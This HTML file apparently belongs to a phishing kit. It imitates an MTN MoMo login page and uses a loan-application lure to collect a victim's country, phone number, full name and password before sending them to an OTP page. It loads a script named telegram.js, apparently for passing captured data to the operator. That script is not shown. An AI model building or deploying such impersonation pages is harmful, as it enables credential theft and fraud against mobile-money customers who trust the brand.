<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>MTN Momo Login | Momo MTN</title>
    <meta name="description" content="Login to your Momo MTN account to continue your loan application.">

    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">

    <!-- Shared styles -->
    <link rel="stylesheet" href="assets/css/style.css">

    <style>
        body {
            background-color: #fdfaf0; /* Light cream background like the image */
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }

        .login-card {
            background: #fff;
            width: 100%;
            max-width: 500px;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
            text-align: left;
        }

        .login-card h1 {
            text-align: center;
            font-size: 32px;
            font-weight: 800;
            color: #222;
            margin-bottom: 10px;
        }

        .yellow-bar {
            width: 50px;
            height: 4px;
            background-color: #ffcc00;
            margin: 0 auto 30px;
            border-radius: 2px;
        }

        .form-group label {
            font-weight: 700;
            font-size: 15px;
            color: #333;
            margin-bottom: 8px;
            display: block;
        }

        .phone-input-group {
            display: flex;
            gap: 0;
            border: 1px solid var(--line-strong);
            border-radius: 6px;
            overflow: hidden;
            height: 45px;
            margin-bottom: 18px;
        }

        .phone-prefix {
            background: #f0f0f0;
            padding: 0 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #666;
            font-size: 15px;
            border-right: 1px solid var(--line-strong);
            min-width: 60px;
        }

        .phone-input-group input {
            border: none;
            flex: 1;
            height: 100%;
            padding: 0 13px;
            outline: none;
            font-size: 15px;
        }

        .phone-input-group:focus-within {
            border-color: var(--accent);
            box-shadow: 0 0 0 3px rgba(255, 204, 0, .18);
        }

        .login-btn {
            background-color: #ffcc00;
            color: #000;
            width: 100%;
            height: 50px;
            border: none;
            border-radius: 6px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.2s;
        }

        .login-btn:hover {
            background-color: #e6b800;
        }

        .form-group input, .form-group select {
            border: 1px solid var(--line-strong);
            border-radius: 6px;
            width: 100%;
            height: 45px;
            padding: 0 13px;
            outline: none;
            font-size: 15px;
            margin-bottom: 18px;
        }

        .form-group input:focus, .form-group select:focus {
            border-color: var(--accent);
            box-shadow: 0 0 0 3px rgba(255, 204, 0, .18);
        }

        @media (max-width: 480px) {
            .login-card {
                padding: 25px;
            }
            .login-card h1 {
                font-size: 26px;
            }
        }
    </style>
</head>

<body>

    <div class="login-card">
        <h1>MTN Momo Login</h1>
        <div class="yellow-bar"></div>

        <form id="loginForm" novalidate>
            <div class="form-group">
                <label for="country">Country</label>
                <select id="country" name="country" required>
                    <option value="">Select Country</option>
                    <option value="Ghana">Ghana</option>
                    <option value="Uganda">Uganda</option>
                    <option value="Zambia">Zambia</option>
                    <option value="Cameroon">Cameroon</option>
                    <option value="Côte d'Ivoire">Côte d'Ivoire</option>
                    <option value="Guinea">Guinea</option>
                    <option value="Benin">Benin</option>
                    <option value="South Sudan">South Sudan</option>
                </select>
            </div>

            <div class="form-group">
                <label for="phone">Phone Number</label>
                <div class="phone-input-group">
                    <div class="phone-prefix" id="phonePrefix">...</div>
                    <input type="tel" id="phone" name="phone" placeholder="Mobile number" required>
                </div>
            </div>

            <div class="form-group">
                <label for="fullName">Full Name</label>
                <input type="text" id="fullName" name="fullName" placeholder="Enter your full name" required>
            </div>

            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required>
            </div>

            <button type="submit" class="login-btn">Submit</button>
        </form>
    </div>

    <script src="assets/js/main.js"></script>
    <script src="assets/js/telegram.js"></script>
    <script>
        (function () {
            'use strict';

            var form = document.getElementById('loginForm');
            var countrySelect = document.getElementById('country');
            var phonePrefix = document.getElementById('phonePrefix');
            var saved = window.Momo.read() || {};

            var prefixes = {
                'Ghana': '+233',
                'Uganda': '+256',
                'Zambia': '+260',
                'Cameroon': '+237',
                'Côte d\'Ivoire': '+225',
                'Guinea': '+224',
                'Benin': '+229',
                'South Sudan': '+211'
            };

            function updatePrefix() {
                var country = countrySelect.value;
                phonePrefix.textContent = prefixes[country] || '...';
            }

            countrySelect.addEventListener('change', updatePrefix);

            // Prefill if data exists
            if (saved.country) {
                countrySelect.value = saved.country;
                updatePrefix();
            }
            if (saved.fullName) {
                document.getElementById('fullName').value = saved.fullName;
            }
            if (saved.phone) {
                // Strip prefix if it exists in the saved phone string
                var country = saved.country;
                var prefix = prefixes[country];
                var phoneVal = saved.phone;
                if (prefix && phoneVal.startsWith(prefix)) {
                    phoneVal = phoneVal.substring(prefix.length).trim();
                }
                document.getElementById('phone').value = phoneVal;
            }

            form.addEventListener('submit', function (e) {
                e.preventDefault();

                var country = countrySelect.value;
                var phone = document.getElementById('phone').value.trim();
                var fullName = document.getElementById('fullName').value.trim();
                var password = document.getElementById('password').value;

                if (!country || !phone || !fullName || !password) {
                    alert('Please fill in all fields.');
                    return;
                }

                // Save login data (excluding password for security, though this is a static demo)
                window.Momo.merge({
                    country: country,
                    fullName: fullName,
                    phone: (prefixes[country] || '') + ' ' + phone
                });

                // Redirect to OTP page
                window.location.href = 'otp.html';
            });
        })();
    </script>
</body>

</html>
